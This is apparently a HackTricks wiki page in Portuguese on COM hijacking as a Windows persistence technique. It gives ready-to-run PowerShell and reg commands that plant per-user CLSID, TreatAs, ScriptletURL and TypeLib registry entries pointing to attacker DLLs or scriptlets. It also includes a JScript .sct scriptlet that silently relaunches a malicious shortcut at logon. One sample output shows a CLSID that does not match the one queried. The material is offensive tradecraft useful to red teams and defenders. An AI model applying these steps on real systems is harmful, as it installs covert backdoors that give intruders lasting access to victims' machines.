# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Procurando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **persistence mechanism**. Usando `procmon` é fácil encontrar entradas de registro COM procuradas que ainda não existem e que poderiam ser criadas por um atacante. Filtros clássicos:

- Operações **RegOpenKey**.
- onde o _Result_ é **NAME NOT FOUND**.
- e o _Path_ termina com **InprocServer32**.

Variações úteis durante hunting:

- Também procure por chaves **`LocalServer32`** ausentes. Algumas classes COM são servidores fora do processo e irão iniciar um EXE controlado pelo atacante em vez de uma DLL.
- Procure por operações de registro **`TreatAs`** e **`ScriptletURL`** além de `InprocServer32`. Conteúdo recente de detecção e writeups de malware continuam destacando esses porque são muito mais raros que registros COM normais e, portanto, de alto sinal.
- Copie o legítimo **`ThreadingModel`** do `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` original ao clonar uma entrada para HKCU. Usar o modelo errado frequentemente quebra a ativação e torna o hijack ruidoso.
- Em sistemas 64-bit, inspecione tanto as visões 64-bit quanto 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`) porque aplicações 32-bit podem resolver um registro COM diferente.

Uma vez decidido qual COM inexistente você vai impersonar, execute os comandos a seguir. _Cuidado se decidir impersonar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM do Task Scheduler que podem ser sequestrados

Windows Tasks usam Custom Triggers para chamar objetos COM e, por serem executadas através do Task Scheduler, é mais fácil prever quando serão disparadas.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Analisando a saída, você pode selecionar uma que será executada **toda vez que um usuário fizer login**, por exemplo.

Agora, ao procurar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, normalmente você verá que o valor não existe em HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Então, você pode simplesmente criar a entrada HKCU e toda vez que o usuário fizer logon, seu backdoor será executado.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite que um CLSID seja emulado por outro. Do ponto de vista ofensivo isso significa que você pode deixar o CLSID original intacto, criar um segundo CLSID por usuário que aponte para `scrobj.dll`, e então redirecionar o objeto COM real para o malicioso com `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Isso é útil quando:

- o aplicativo alvo já instancia um CLSID estável no logon ou na inicialização do app
- você quer um redirecionamento somente via registro em vez de substituir o `InprocServer32` original
- você quer executar um scriptlet `.sct` local ou remoto através do valor `ScriptletURL`

Exemplo de fluxo de trabalho (adaptado do tradecraft público do Atomic Red Team e de pesquisas mais antigas sobre abuso do registro COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notas:

- `scrobj.dll` lê o valor `ScriptletURL` e executa o `.sct` referenciado, então você pode manter o payload como um arquivo local ou carregá-lo remotamente via HTTP/HTTPS.
- `TreatAs` é especialmente útil quando o registro COM original está completo e estável em `HKLM`, porque você precisa apenas de um pequeno redirecionamento por usuário em vez de espelhar toda a árvore.
- Para validação sem esperar pelo gatilho natural, você pode instanciar o ProgID/CLSID falso manualmente com `rundll32.exe -sta <ProgID-or-CLSID>` se a classe alvo suportar ativação STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definem interfaces COM e são carregadas via `LoadTypeLib()`. Quando um servidor COM é instanciado, o SO também pode carregar o TypeLib associado consultando chaves de registro sob `HKCR\TypeLib\{LIBID}`. Se o caminho do TypeLib for substituído por um **moniker**, e.g. `script:C:\...\evil.sct`, o Windows executará o scriptlet quando o TypeLib for resolvido — resultando em uma persistência discreta que é acionada quando componentes comuns são acessados.

Isso foi observado contra o Microsoft Web Browser control (frequentemente carregado pelo Internet Explorer, apps embedding WebBrowser, e até `explorer.exe`).

### Passos (PowerShell)

1) Identifique o TypeLib (LIBID) usado por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por cadeias de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Aponte o caminho TypeLib por usuário para um scriptlet local usando o moniker `script:` (não são necessários privilégios de administrador):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop um JScript `.sct` mínimo que relança seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Disparo – abrir o IE, uma aplicação que incorpora o WebBrowser control, ou mesmo atividades rotineiras do Explorer carregarão o TypeLib e executarão o scriptlet, rearmando sua cadeia no logon/reboot.

Limpeza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Você pode aplicar a mesma lógica a outros componentes COM de alta frequência; sempre resolva o `LIBID` real a partir de `HKCR\CLSID\{CLSID}\TypeLib` primeiro.
- Em sistemas 64-bit você também pode preencher a subchave `win64` para consumidores de 64-bit.

## Referências

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
